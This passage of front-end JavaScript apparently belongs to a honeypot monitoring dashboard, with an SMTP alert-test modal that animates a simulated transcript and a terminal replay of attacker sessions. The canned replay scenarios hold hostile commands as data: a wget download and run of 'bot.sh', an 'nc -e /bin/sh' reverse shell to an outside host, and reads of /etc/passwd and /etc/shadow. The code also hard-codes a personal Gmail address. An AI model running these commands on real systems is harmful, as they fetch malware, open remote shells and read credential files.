    // Node 3: 60% (70%)
    // Node 4: 80% (90%)
    const stepPercents = ['0%', '20%', '40%', '60%', '80%'];

    nodes.forEach((node, idx) => {
      if (idx < stepIndex) {
        node.classList.remove('active', 'fail');
        node.classList.add('done');
      } else if (idx === stepIndex) {
        node.classList.remove('active', 'done', 'fail');
        node.classList.add(status);
      } else {
        node.classList.remove('active', 'done', 'fail');
      }
    });

    if (fill) {
      if (status === 'done' || status === 'active') {
        fill.style.width = stepPercents[stepIndex];
      }
    }

    if (stepIndex === 4 && status === 'done' && container) {
      container.setAttribute('data-ok', 'true');
      if (fill) fill.style.width = '80%';
    }
  }

  function startDiagCooldown(seconds = 5) {
    const btn = $('#btn-send-test-email');
    const label = $('#btn-email-text');
    if (!btn || !label) return;

    let remaining = seconds;
    btn.disabled = true;
    label.textContent = `Retry in ${remaining}s`;

    if (smtpDiagnostics.cooldownTimer) clearInterval(smtpDiagnostics.cooldownTimer);
    smtpDiagnostics.cooldownTimer = setInterval(() => {
      remaining -= 1;
      if (remaining <= 0) {
        clearInterval(smtpDiagnostics.cooldownTimer);
        smtpDiagnostics.cooldownTimer = null;
        btn.disabled = false;
        label.textContent = 'Send Test Alert';
      } else {
        label.textContent = `Retry in ${remaining}s`;
      }
    }, 1000);
  }

  async function openEmailModal() {
    const modal = $('#email-modal');
    const backdrop = $('#email-modal-backdrop');
    if (!modal || !backdrop) return;

    smtpDiagnostics.isOpen = true;
    smtpDiagnostics.isDispatching = false;

    // Reset any cooldown timer from a prior session
    if (smtpDiagnostics.cooldownTimer) {
      clearInterval(smtpDiagnostics.cooldownTimer);
      smtpDiagnostics.cooldownTimer = null;
    }

    // Refresh: reset all state, logs, stepper, and status every time modal is opened
    clearDiagLogs();
    resetDiagSteps();
    setDiagResultState('idle', 'Ready', '—');

    const sendBtn = $('#btn-send-test-email');
    const sendLabel = $('#btn-email-text');
    const spinner = $('#email-spinner');
    const simFailCheckbox = $('#diag-sim-fail');
    const wrapper = $('#diag-input-wrapper');
    const errMsg = $('#diag-err-msg');

    if (sendBtn) {
      sendBtn.disabled = false;
      sendBtn.removeAttribute('aria-busy');
    }
    if (sendLabel) sendLabel.textContent = 'Send Test Alert';
    if (spinner) spinner.style.display = 'none';
    if (simFailCheckbox) simFailCheckbox.checked = false;
    if (wrapper) wrapper.removeAttribute('data-invalid');
    if (errMsg) errMsg.textContent = '';
    modal.classList.remove('shake');

    backdrop.hidden = false;
    modal.hidden = false;

    requestAnimationFrame(() => {
      modal.classList.add('open');
      backdrop.classList.add('open');
    });

    try {
      const res = await fetch('/api/alerts/status');
      if (res.ok) {
        const data = await res.json();
        smtpDiagnostics.cachedConfig = data;
        if ($('#diag-smtp-server')) {
          $('#diag-smtp-server').textContent = `${data.smtp_host}:${data.smtp_port}`;
        }
        if ($('#diag-smtp-account')) {
          $('#diag-smtp-account').textContent = data.smtp_username || 'Not configured';
        }
        if ($('#diag-smtp-threshold')) {
          $('#diag-smtp-threshold').innerHTML = `Risk &ge; ${data.threshold} or Tor Exit Node`;
        }
        if ($('#diag-smtp-cooldown')) {
          $('#diag-smtp-cooldown').textContent = `${data.cooldown_seconds}s per-IP`;
        }
        const emailInput = $('#diag-recipient-email');
        if (emailInput && data.recipient && !emailInput.value.trim()) {
          emailInput.value = data.recipient;
        }
      }
    } catch (e) {
      console.warn('[HoneyTrack] Could not fetch alert status:', e);
    }
  }

  function closeEmailModal() {
    const modal = $('#email-modal');
    const backdrop = $('#email-modal-backdrop');
    if (!modal || !backdrop) return;

    smtpDiagnostics.isOpen = false;
    modal.classList.add('closing');
    modal.classList.remove('open');
    backdrop.classList.remove('open');

    setTimeout(() => {
      if (!smtpDiagnostics.isOpen) {
        modal.hidden = true;
        backdrop.hidden = true;
        modal.classList.remove('closing');
      }
    }, 240);
  }

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  async function sendTestEmailAlert() {
    if (smtpDiagnostics.isDispatching) return;

    const emailInput = $('#diag-recipient-email');
    const wrapper = $('#diag-input-wrapper');
    const errMsg = $('#diag-err-msg');
    const modal = $('#email-modal');
    const sendBtn = $('#btn-send-test-email');
    const spinner = $('#email-spinner');
    const label = $('#btn-email-text');
    const simFailCheckbox = $('#diag-sim-fail');

    const recipient = (emailInput?.value || '').trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!recipient || !emailRegex.test(recipient)) {
      if (wrapper) wrapper.setAttribute('data-invalid', 'true');
      if (errMsg) errMsg.textContent = 'Please provide a valid operator email address (e.g. name@domain.com)';
      if (modal) {
        modal.classList.add('shake');
        setTimeout(() => modal.classList.remove('shake'), 450);
      }
      emailInput?.focus();
      return;
    }

    if (wrapper) wrapper.removeAttribute('data-invalid');
    if (errMsg) errMsg.textContent = '';

    smtpDiagnostics.isDispatching = true;
    sendBtn.disabled = true;
    sendBtn.setAttribute('aria-busy', 'true');
    if (spinner) spinner.style.display = 'block';
    if (label) label.textContent = 'CONNECTING...';

    const startTime = performance.now();
    resetDiagSteps();
    setDiagResultState('sending', 'Connecting...', 'In progress');

    const host = smtpDiagnostics.cachedConfig?.smtp_host || 'smtp.gmail.com';
    const port = smtpDiagnostics.cachedConfig?.smtp_port || 587;
    const account = smtpDiagnostics.cachedConfig?.smtp_username || 'shakthin21@gmail.com';
    const simulateFail = simFailCheckbox ? simFailCheckbox.checked : false;

    // Start background network request concurrently with protocol visualization
    let resPromise = null;
    if (!simulateFail) {
      resPromise = fetch('/api/alerts/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: recipient })
      }).catch(err => ({ ok: false, errorObj: err }));
    }

    // Step 0: Connect (Smooth & Deliberate)
    updateDiagStep(0, 'active');
    appendDiagLog('→', `CONNECT ${host}:${port}`, 'c');
    await delay(600);

    appendDiagLog('←', `220 ${host} ESMTP ready at ${new Date().toISOString()}`, 's');
    updateDiagStep(0, 'done');
    await delay(350);

    // Step 1: TLS
    updateDiagStep(1, 'active');
    appendDiagLog('→', 'EHLO honeytrack.soc.internal', 'c');
    await delay(450);
    appendDiagLog('←', `250-${host} at your service, [STARTTLS, AUTH LOGIN PLAIN, 8BITMIME]`, 's');
    await delay(350);
    appendDiagLog('→', 'STARTTLS', 'c');
    await delay(450);
    appendDiagLog('←', '220 2.0.0 Ready to start TLS cryptographic handshake', 's');
    appendDiagLog('s', 'TLSv1.3 / TLS_AES_256_GCM_SHA384 handshake established', 's');
    updateDiagStep(1, 'done');
    await delay(350);

    // Step 2: Auth
    updateDiagStep(2, 'active');
    appendDiagLog('→', 'AUTH LOGIN', 'c');
    await delay(450);
    appendDiagLog('←', '334 VXNlcm5hbWU6 (base64 username request)', 's');
    appendDiagLog('→', `[Base64] ${btoa(account)}`, 'c');
    await delay(450);
    appendDiagLog('←', '334 UGFzc3dvcmQ6 (base64 password request)', 's');

    if (simulateFail) {
      appendDiagLog('→', '[Base64] ******************** (simulated bad app password)', 'c');
      await delay(650);
      appendDiagLog('!', '535-5.7.8 Username and Password not accepted.', 'e');
      appendDiagLog('!', '535 5.7.8 Learn more at https://support.google.com/mail/?p=BadCredentials (auth fail simulation)', 'e');
      updateDiagStep(2, 'fail');
      
      const durationMs = Math.round(performance.now() - startTime);
      setDiagResultState('error', 'Auth Failed', `${durationMs}ms`);

      smtpDiagnostics.isDispatching = false;
      sendBtn.removeAttribute('aria-busy');
      if (spinner) spinner.style.display = 'none';
      startDiagCooldown(5);
      return;
    }

    appendDiagLog('→', '[Base64] ******************** (Google App Password)', 'c');
    await delay(500);
    appendDiagLog('←', '235 2.7.0 Accepted: Operator credentials authenticated successfully', 's');
    updateDiagStep(2, 'done');
    await delay(350);

    // Step 3: Send
    updateDiagStep(3, 'active');
    appendDiagLog('→', `MAIL FROM:<${account}>`, 'c');
    await delay(400);
    appendDiagLog('←', '250 2.1.0 Sender OK', 's');
    appendDiagLog('→', `RCPT TO:<${recipient}>`, 'c');
    await delay(400);
    appendDiagLog('←', `250 2.1.5 Recipient ${recipient} OK`, 's');
    appendDiagLog('→', 'DATA', 'c');
    await delay(400);
    appendDiagLog('←', '354 Start mail input; end with <CRLF>.<CRLF>', 's');
    appendDiagLog('→', 'Subject: [HoneyTrack] Risk 95: 185.220.101.5 ran uname -a on SSH decoy', 'c');
    appendDiagLog('→', '.', 'c');

    try {
      const res = await resPromise;
      if (res.errorObj) throw res.errorObj;
      const data = await res.json();
      const durationMs = Math.round(performance.now() - startTime);

      if (res.ok && data.success) {
        updateDiagStep(3, 'done');
        await delay(300);
        appendDiagLog('←', '250 2.0.0 OK queued for dispatch to remote MX relay', 's');
        appendDiagLog('→', 'QUIT', 'c');
        await delay(250);
        appendDiagLog('←', '221 2.0.0 Service closing transmission channel', 's');
        
        // Step 4: Delivered
        updateDiagStep(4, 'done');
        setDiagResultState('success', 'Delivered', `${durationMs}ms`);
      } else {
        updateDiagStep(3, 'fail');
        const errDetail = data.message || data.error || 'Failed to dispatch email';
        appendDiagLog('!', `SMTP Server Rejected: ${errDetail}`, 'e');
        setDiagResultState('error', 'Rejected', `${durationMs}ms`);
      }
    } catch (netErr) {
      const durationMs = Math.round(performance.now() - startTime);
      updateDiagStep(3, 'fail');
      appendDiagLog('!', `Network Error: ${netErr.message || netErr}`, 'e');
      setDiagResultState('error', 'Network Fault', `${durationMs}ms`);
    } finally {
      smtpDiagnostics.isDispatching = false;
      sendBtn.removeAttribute('aria-busy');
      if (spinner) spinner.style.display = 'none';
      startDiagCooldown(5);
    }
  }

  // Copy Account Email
  $('#btn-copy-account')?.addEventListener('click', async () => {
    const acctEl = $('#diag-smtp-account');
    const btn = $('#btn-copy-account');
    if (!acctEl || !btn) return;
    const text = acctEl.textContent.trim();
    if (!text || text === 'Not configured') return;

    try {
      await navigator.clipboard.writeText(text);
      const originalSvg = btn.innerHTML;
      btn.innerHTML = `<svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="#3ddc97" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`;
      btn.style.color = '#3ddc97';
      setTimeout(() => {
        btn.innerHTML = originalSvg;
        btn.style.color = '';
      }, 1200);
    } catch (e) {
      console.warn('Clipboard write failed:', e);
    }
  });

  // Copy Transcript Log
  $('#btn-copy-transcript')?.addEventListener('click', async () => {
    const btn = $('#btn-copy-transcript');
    if (!smtpDiagnostics.logs.length) return;

    const formatted = smtpDiagnostics.logs.map(l => `[${l.time}] ${l.direction} ${l.text}`).join('\n');
    try {
      await navigator.clipboard.writeText(formatted);
      if (btn) {
        const prevText = btn.textContent;
        btn.textContent = 'Copied!';
        btn.style.color = '#3ddc97';
        setTimeout(() => {
          btn.textContent = prevText;
          btn.style.color = '';
        }, 1200);
      }
    } catch (e) {
      console.warn('Clipboard transcript copy failed:', e);
    }
  });

  // Clear Transcript Log
  $('#btn-clear-transcript')?.addEventListener('click', () => {
    clearDiagLogs();
  });

  // Keyboard Shortcuts: Ctrl+Enter (Send), Esc (Close)
  document.addEventListener('keydown', (e) => {
    if (!smtpDiagnostics.isOpen) return;

    if (e.key === 'Escape') {
      e.preventDefault();
      closeEmailModal();
    } else if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
      e.preventDefault();
      sendTestEmailAlert();
    }
  });

  $('#btn-email-modal-toggle')?.addEventListener('click', openEmailModal);
  $('#btn-close-email-modal')?.addEventListener('click', closeEmailModal);
  $('#email-modal-backdrop')?.addEventListener('click', closeEmailModal);
  $('#btn-send-test-email')?.addEventListener('click', sendTestEmailAlert);

  $('#btn-table-pdf')?.addEventListener('click', () => {
    exportPdfReport();
  });

  // ─────────────────────────────────────────────────────────────
  // Base UI / Shadcn Combobox Controller
  // ─────────────────────────────────────────────────────────────
  function initComboboxes() {
    const roots = document.querySelectorAll('.combobox-root');
    if (!roots.length) return;

    function closeAllComboboxes() {
      roots.forEach((root) => {
        root.classList.remove('is-open');
        const trigger = root.querySelector('.combobox-trigger');
        if (trigger) trigger.setAttribute('aria-expanded', 'false');
      });
    }

    roots.forEach((root) => {
      const trigger = root.querySelector('.combobox-trigger');
      const input = root.querySelector('input[type="hidden"]');
      const valueEl = root.querySelector('.combobox-value');
      const items = root.querySelectorAll('.combobox-item');

      if (!trigger || !input) return;

      // Toggle dropdown open/close
      trigger.addEventListener('click', () => {
        const isOpen = root.classList.contains('is-open');
        closeAllComboboxes();
        if (!isOpen) {
          root.classList.add('is-open');
          trigger.setAttribute('aria-expanded', 'true');
        }
      });

      // Selection handling
      items.forEach((item) => {
        item.addEventListener('click', (e) => {
          e.stopPropagation();
          const val = item.getAttribute('data-value') || 'ALL';
          const text = item.querySelector('.combobox-item-text')?.textContent.trim() || val;

          input.value = val;
          if (valueEl) valueEl.textContent = text;

          items.forEach((it) => {
            const isMatch = it === item;
            it.classList.toggle('is-selected', isMatch);
            it.setAttribute('aria-selected', isMatch ? 'true' : 'false');
          });

          root.classList.remove('is-open');
          trigger.setAttribute('aria-expanded', 'false');

          input.dispatchEvent(new Event('change', { bubbles: true }));
        });
      });
    });

    document.addEventListener('click', (e) => {
      if (!e.target.closest('.combobox-root')) {
        closeAllComboboxes();
      }
    });

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        closeAllComboboxes();
      }
    });
  }

  initComboboxes();

  $('#filter-service')?.addEventListener('change', () => {
    page = 1;
    renderTable();
  });

  $('#filter-risk')?.addEventListener('change', () => {
    page = 1;
    renderTable();
  });

  $('#filter-tor')?.addEventListener('change', () => {
    page = 1;
    renderTable();
  });

  $('#btn-reset-filters')?.addEventListener('click', () => {
    if ($('#filter-service')) $('#filter-service').value = 'ALL';
    if ($('#filter-risk')) $('#filter-risk').value = 'ALL';
    if ($('#filter-tor')) $('#filter-tor').value = 'ALL';
    if ($('#event-search')) $('#event-search').value = '';

    // Reset all comboboxes to their default 'ALL' item
    document.querySelectorAll('.combobox-root').forEach((root) => {
      const defaultItem = root.querySelector('.combobox-item[data-value="ALL"]');
      const defaultText = defaultItem?.querySelector('.combobox-item-text')?.textContent.trim() || 'All';
      const valEl = root.querySelector('.combobox-value');
      if (valEl) valEl.textContent = defaultText;

      root.querySelectorAll('.combobox-item').forEach((it) => {
        const isDefault = it === defaultItem;
        it.classList.toggle('is-selected', isDefault);
        it.setAttribute('aria-selected', isDefault ? 'true' : 'false');
      });

      root.classList.remove('is-open');
    });

    page = 1;
    renderTable();
  });

  $('#btn-clear-live')?.addEventListener('click', async () => {
    if (!confirm('Are you sure you want to clear live production attacks and restart counts from 0?')) return;
    try {
      const res = await fetch('/api/admin/clear-live', { method: 'POST' });
      if (res.ok) {
        events = [];
        highestEventId = 0;
        markers.forEach((m) => m.remove());
        markers.clear();
        const statsRes = await fetch('/api/stats').then((r) => r.json());
        updateStatsDisplay(statsRes, false);
        renderFeed();
        renderTable();
      }
    } catch (err) {
      console.error('[HoneyTrack] Error clearing live events:', err);
    }
  });



  $('#event-search')?.addEventListener('input', () => {
    page = 1;
    renderTable();
  });

  $('#previous-page')?.addEventListener('click', () => {
    if (page > 1) {
      page--;
      renderTable();
    }
  });

  $('#next-page')?.addEventListener('click', () => {
    page++;
    renderTable();
  });

  // Backend API fetching
  async function loadInitialData() {
    try {
      const [eventsRes, statsRes] = await Promise.all([
        fetch('/api/events?limit=300').then((r) => r.json()),
        fetch('/api/stats').then((r) => r.json()),
        refreshBlockedIps()
      ]);

      if (Array.isArray(eventsRes) && eventsRes.length > 0) {
        events = eventsRes.map(normalizeEvent);
        highestEventId = Math.max(...events.map((e) => e.id));
      }

      updateStatsDisplay(statsRes, true);
      initMap();
      renderFeed();
      renderTable();
    } catch (err) {
      console.error('[HoneyTrack] Error loading initial telemetry:', err);
    }
  }

  async function pollLatestEvents() {
    try {
      const url = highestEventId > 0
        ? `/api/events/latest?since_id=${highestEventId}`
        : '/api/events?limit=20';

      const res = await fetch(url);
      if (!res.ok) return;
      const newItems = await res.json();

      if (Array.isArray(newItems) && newItems.length > 0) {
        const normalized = newItems.map(normalizeEvent);
        normalized.sort((a, b) => b.id - a.id);

        for (const ev of normalized) {
          if (!events.some((e) => e.id === ev.id)) {
            events.unshift(ev);
            addMarker(ev, true);
            if (ev.id > highestEventId) highestEventId = ev.id;
          }
        }
        if (events.length > 200) {
          events.length = 200;
        }

        renderFeed();
        renderTable();

        // Refresh stats after new events
        const statsRes = await fetch('/api/stats').then((r) => r.json());
        updateStatsDisplay(statsRes, false);
      }
    } catch (err) {
      console.warn('[HoneyTrack] Polling error:', err);
    }
  }

  // Periodic relative time tick
  window.setInterval(() => {
    document.querySelectorAll('[data-time]').forEach((el) => {
      el.textContent = timeAgo(Number(el.dataset.time));
    });
    if (events[0]) {
      $('#last-time').textContent = `${timeAgo(events[0].timestamp)} · ${formatTime(events[0].timestamp)} UTC`;
    }
  }, 1000);

  // Poll backend every 2.5 seconds
  window.setInterval(pollLatestEvents, 2500);

  // Poll stats and firewall blacklist every 15 seconds to ensure synchronization
  window.setInterval(async () => {
    try {
      const [statsRes] = await Promise.all([
        fetch('/api/stats').then((r) => r.json()),
        refreshBlockedIps()
      ]);
      updateStatsDisplay(statsRes, false);
      renderFeed();
      renderTable();
    } catch (_) {}
  }, 15000);

  // ─────────────────────────────────────────────────────────────
  // Modern High-Fidelity Terminal Session Replay Controller (v3.0)
  // ─────────────────────────────────────────────────────────────
  let replaySessions = [];
  let activeSession = null;
  let activeLineEls = [];
  let replayPlaying = false;
  let replayLoop = false;
  let replaySpeed = 1; // 1x, 2x, 4x
  let replayT = 0; // ms
  let replayRafId = null;
  let replayLastNow = 0;
  let autoScroll = true;

  // Syntax Highlighter for Terminal Replay
  function hlToken(s) {
    const parts = s.split(/(\s+|&&|\|\||[|><;])/);
    let cmdFound = false;
    return parts.map((p) => {
      if (!p) return '';
      if (/^\s+$/.test(p)) return p;
      if (/^(&&|\|\||[|><;])$/.test(p)) {
        cmdFound = false;
        return `<span class="op">${escapeHtml(p)}</span>`;
      }
      if (!cmdFound && !p.startsWith('-')) {
        cmdFound = true;
        return `<span class="c0">${escapeHtml(p)}</span>`;
      }
      if (p.startsWith('-')) return `<span class="fl">${escapeHtml(p)}</span>`;
      if (/^["'].*["']$/.test(p)) return `<span class="str">${escapeHtml(p)}</span>`;
      if (/^[\/~]/.test(p)) return `<span class="pth">${escapeHtml(p)}</span>`;
      return `<span class="ar">${escapeHtml(p)}</span>`;
    }).join('');
  }

  function formatReplayTime(ms) {
    const s = Math.max(0, Math.floor(ms / 1000));
    const m = Math.floor(s / 60);
    const r = s % 60;
    return `${String(m).padStart(2, '0')}:${String(r).padStart(2, '0')}`;
  }

  // Curated Attack Telemetry Scenarios
  const CURATED_REPLAY_SCENARIOS = [
    {
      id: "recon-threat-01",
      ip: "185.220.101.35",
      user: "root",
      host: "honeypot-primary",
      port: "SSH:2222",
      path: "~",
      group: "CURATED THREAT SCENARIOS",
      label: "185.220.101.35 · SSH:2222 (root) · 6 cmds",
      lines: [
        { t: "cmd", v: "whoami", d: 1000 },
        { t: "out", v: "root", d: 250 },
        { t: "cmd", v: "id", d: 850 },
        { t: "out", v: "uid=0(root) gid=0(root) groups=0(root)", d: 300 },
        { t: "cmd", v: "uname -a", d: 1200 },
        { t: "out", v: "Linux honeypot-primary-sensor 5.15.0-91-generic x86_64 GNU/Linux", d: 350 },
        { t: "cmd", v: "cat /etc/passwd", d: 1300 },
        { t: "out", v: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", d: 450 },
        { t: "cmd", v: "cat /etc/shadow", d: 1400 },
        { t: "err", v: "cat: /etc/shadow: Permission denied", d: 300 },
        { t: "ok",  v: "✔ Intrusive privilege access intercepted & quarantined.", d: 350 },
        { t: "cmd", v: "exit", d: 800 },
        { t: "out", v: "logout", d: 250 },
        { t: "ok",  v: "✔ Telemetry committed to HoneyTrack threat intelligence matrix.", d: 350 }
      ]
    },
    {
      id: "malware-dropper-02",
      ip: "45.155.205.233",
      user: "ubuntu",
      host: "honeypot-sandbox",
      port: "SSH:2222",
      path: "~",
      group: "CURATED THREAT SCENARIOS",
      label: "45.155.205.233 · SSH:2222 (ubuntu) · 5 cmds",
      lines: [
        { t: "cmd", v: "whoami", d: 900 },
        { t: "out", v: "ubuntu", d: 250 },
        { t: "cmd", v: "pwd", d: 700 },
        { t: "out", v: "/home/ubuntu", d: 250 },
        { t: "cmd", v: "wget http://185.220.101.35/bot.sh", d: 1600 },
        { t: "out", v: "Connecting to 185.220.101.35:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 14920 (14K) [application/x-sh]\nSaving to: 'bot.sh'", d: 650 },
        { t: "ok",  v: "✔ bot.sh 100% [===================>] 14.57K --.-KB/s in 0.04s", d: 350 },
        { t: "ok",  v: "✔ 'bot.sh' captured in decoy sandbox quarantine.", d: 350 },
        { t: "cmd", v: "chmod +x bot.sh", d: 1100 },
        { t: "ok",  v: "✔ Permissions updated: a+x", d: 250 },
        { t: "cmd", v: "./bot.sh", d: 1000 },
        { t: "err", v: "Initializing C2 botnet payload...\n[CRITICAL] Sandbox anomaly detected. Payload execution halted.", d: 450 },
        { t: "ok",  v: "✔ Extracted IoC SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", d: 350 },
        { t: "cmd", v: "exit", d: 750 },
        { t: "out", v: "logout", d: 250 }
      ]
    },
    {
      id: "revshell-attack-03",
      ip: "218.92.0.107",
      user: "admin",
      host: "honeypot-jail",
      port: "SSH:2222",
      path: "~",
      group: "CURATED THREAT SCENARIOS",
      label: "218.92.0.107 · SSH:2222 (admin) · 5 cmds",
      lines: [
        { t: "cmd", v: "uname -a", d: 1000 },
        { t: "out", v: "Linux honeypot-primary-sensor 5.15.0-91-generic x86_64", d: 250 },
        { t: "cmd", v: "nc -e /bin/sh 198.51.100.42 4444", d: 1500 },
        { t: "err", v: "-bash: nc: command not found (prohibited by honeypot runtime)", d: 300 },
        { t: "cmd", v: "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'", d: 1800 },
        { t: "ok",  v: "$ /bin/sh spawned in restricted honeypot memory jail", d: 350 },
        { t: "cmd", v: "whoami", d: 750 },
        { t: "out", v: "root (simulated shell environment)", d: 250 },
        { t: "cmd", v: "history", d: 850 },
        { t: "out", v: "    1  uname -a\n    2  nc -e /bin/sh 198.51.100.42 4444\n    3  python3 -c 'import pty;pty.spawn(\"/bin/sh\")'\n    4  whoami\n    5  history", d: 450 },
        { t: "cmd", v: "exit", d: 700 },
        { t: "ok",  v: "✔ Intrusion closed. Source IP blacklisted via Active Defense.", d: 350 }
      ]
    }
  ];

  function parseApiSession(sess) {
    const lines = [];
    const rawCmds = sess.commands || [];
    const rawOuts = sess.outputs || {};

    if (rawCmds.length > 0) {
      rawCmds.forEach((c, idx) => {
        const cmdStr = typeof c === 'string' ? c : (c[0] || '');
        if (cmdStr) {
          lines.push({ t: 'cmd', v: cmdStr, d: 700 + Math.min(cmdStr.length * 30, 1000) });
        }
        let outList = rawOuts[idx];
        if (!outList && Array.isArray(c) && c[1]) {
          outList = String(c[1]).split('\n');
        }
        if (Array.isArray(outList)) {
          outList.forEach((ol) => {
            if (!ol) return;
            const isErr = ol.includes('error') || ol.includes('denied') || ol.includes('fail') || ol.includes('CRITICAL');
            const isOk = ol.startsWith('✔') || ol.includes('passed') || ol.includes('saved');
            lines.push({ t: isErr ? 'err' : isOk ? 'ok' : 'out', v: ol, d: 250 });
          });
        }
      });
    } else {
      lines.push({ t: 'cmd', v: 'whoami', d: 800 });
      lines.push({ t: 'out', v: sess.username || 'root', d: 250 });
      lines.push({ t: 'cmd', v: 'uname -a', d: 1000 });
      lines.push({ t: 'out', v: 'Linux honeypot-primary-sensor 5.15.0-91-generic x86_64', d: 300 });
    }

    const cmdCount = lines.filter((l) => l.t === 'cmd').length;
    return {
      id: sess.session_id || `sess-${Date.now()}`,
      ip: sess.source_ip || '127.0.0.1',
      user: sess.username || 'root',
      host: 'honeypot-sensor',
      port: sess.service || 'SSH:2222',
      path: '~',
      group: 'RECORDED THREAT SESSIONS',
      label: `${sess.source_ip} · ${sess.service || 'SSH'} (${sess.username || 'root'}) · ${cmdCount} cmd${cmdCount === 1 ? '' : 's'}`,
      lines
    };
  }

  function buildSessionTimings(session) {
    let curT = 250;
    session.lines.forEach((ln) => {
      ln.t0 = curT;
      if (ln.t === 'cmd') {
        const charCount = Math.max(1, ln.v.length);
        const typingDuration = 200 + charCount * 38;
        ln.t1 = curT + typingDuration;
        curT = ln.t1 + (ln.d || 350);
      } else {
        const outDuration = ln.d || 220;
        ln.t1 = curT + outDuration;
        curT = ln.t1 + 60;
      }
    });
    session.tot = curT + 500;
  }

  function paintReplay() {
    if (!activeSession) return;
    const tot = activeSession.tot;
    const clampedT = Math.min(replayT, tot);

    const cIp = $('#cIp');
    const cUser = $('#cUser');
    const cPort = $('#cPort');
    const cCmd = $('#cCmd');
    const timeEl = $('#replay-time');
    const fillEl = $('#replay-fill');
    const titleEl = $('#replay-title');

    if (cIp) cIp.textContent = activeSession.ip;
    if (cUser) cUser.textContent = activeSession.user;
    if (cPort) cPort.textContent = activeSession.port;
    if (cCmd) cCmd.textContent = String(activeSession.lines.filter((l) => l.t === 'cmd').length);
    if (timeEl) timeEl.textContent = `${formatReplayTime(clampedT)} / ${formatReplayTime(tot)}`;
    if (fillEl) fillEl.style.width = `${Math.min(100, (clampedT / tot) * 100).toFixed(1)}%`;
    if (titleEl) titleEl.textContent = `bash — ${activeSession.ip} (${activeSession.user})`;

    const term = $('#term');
    if (!term) return;

    activeLineEls.forEach((el, idx) => {
      const ln = activeSession.lines[idx];
      if (clampedT < ln.t0) {
        el.className = 'ln';
        el.innerHTML = '';
        return;
      }

      if (ln.t === 'cmd') {
        el.className = `ln v ${idx > 0 && activeSession.lines[idx - 1].t !== 'cmd' ? 'mt' : ''}`;
        const frac = Math.min(1, Math.max(0, (clampedT - ln.t0) / Math.max(1, ln.t1 - ln.t0)));
        const visibleLen = Math.floor(frac * ln.v.length);
        const typedText = ln.v.slice(0, visibleLen);
        const isTyping = frac < 1;
        const promptHtml = `<span class="u">${escapeHtml(activeSession.user)}</span><span class="at">@</span><span class="h">${escapeHtml(activeSession.host)}</span>:<span class="pth">${escapeHtml(activeSession.path)}</span><span class="d">$ </span>`;
        el.innerHTML = `${promptHtml}${hlToken(typedText)}${isTyping ? '<span class="caret"></span>' : ''}`;
      } else {
        el.className = `ln v out ${ln.t === 'err' ? 'err' : ln.t === 'ok' ? 'ok' : ''}`;
        el.textContent = ln.v;
      }
    });

    if (autoScroll) {
      term.scrollTop = term.scrollHeight;
    }
  }

  function tickReplay(now) {
    if (!replayPlaying) return;
    if (!replayLastNow) replayLastNow = now;
    const dt = (now - replayLastNow) * replaySpeed;
    replayLastNow = now;
    replayT += dt;

    paintReplay();

    if (activeSession && replayT >= activeSession.tot) {
      if (replayLoop) {
        replayT = 0;
        replayRafId = requestAnimationFrame(tickReplay);
      } else {
        replayPlaying = false;
        const badge = $('#replay-badge');
        if (badge) {
          badge.textContent = 'COMPLETED';
          badge.className = 'badge done';
        }
      }
      return;
    }

    replayRafId = requestAnimationFrame(tickReplay);
  }

  function playReplay() {
    if (!activeSession) return;
    if (replayT >= activeSession.tot) replayT = 0;
    replayPlaying = true;
    replayLastNow = performance.now();
    const badge = $('#replay-badge');
    if (badge) {
      badge.textContent = 'REPLAYING';
      badge.className = 'badge';
    }
    if (replayRafId) cancelAnimationFrame(replayRafId);
    replayRafId = requestAnimationFrame(tickReplay);
  }

  function pauseReplay() {
    replayPlaying = false;
    if (replayRafId) {
      cancelAnimationFrame(replayRafId);
      replayRafId = null;
    }
    const badge = $('#replay-badge');
    if (badge && badge.textContent !== 'COMPLETED') {
      badge.textContent = 'PAUSED';
      badge.className = 'badge paused';
    }
  }

  function restartReplay() {
    replayT = 0;
    paintReplay();
    playReplay();
  }

  function loadSessionIntoTerminal(session) {
    pauseReplay();
    activeSession = session;
    buildSessionTimings(session);

    const term = $('#term');
    if (term) {
      term.innerHTML = '';
      activeLineEls = session.lines.map(() => {
        const d = document.createElement('div');
        d.className = 'ln';
        term.appendChild(d);
        return d;
      });
    }

    const labelEl = $('#replay-dd-label');
    if (labelEl) labelEl.textContent = session.label || session.ip;

    const listEl = $('#replay-dd-list');
    if (listEl) {
      listEl.querySelectorAll('li').forEach((li) => {
        const isSel = li.dataset.id === session.id;
        li.setAttribute('aria-selected', isSel ? 'true' : 'false');
        if (isSel) li.classList.add('act');
        else li.classList.remove('act');
      });
    }

    replayT = 0;
    paintReplay();
    playReplay();
  }

  async function populateReplayDropdown(preferredId = null) {
    let apiSessions = [];
    try {
      const res = await fetch('/api/sessions?limit=50').then((r) => r.json());
      if (res.status === 'success' && Array.isArray(res.sessions)) {
        apiSessions = res.sessions.map(parseApiSession);
      }
    } catch (_) {}

    replaySessions = [...CURATED_REPLAY_SCENARIOS, ...apiSessions];

    const listEl = $('#replay-dd-list');
    if (!listEl) return;
    listEl.innerHTML = '';

    const groups = {};
    replaySessions.forEach((s) => {
      const g = s.group || 'GENERAL';
      if (!groups[g]) groups[g] = [];
      groups[g].push(s);
    });

    Object.entries(groups).forEach(([grpName, sessList]) => {
      const grpHeader = document.createElement('div');
      grpHeader.className = 'dd-grp-label';
      grpHeader.textContent = grpName;
      listEl.appendChild(grpHeader);

      sessList.forEach((s) => {
        const li = document.createElement('li');
        li.dataset.id = s.id;
        li.setAttribute('role', 'option');
        li.setAttribute('aria-selected', 'false');
        li.tabIndex = -1;

        const cmdCount = s.lines ? s.lines.filter((l) => l.t === 'cmd').length : 1;
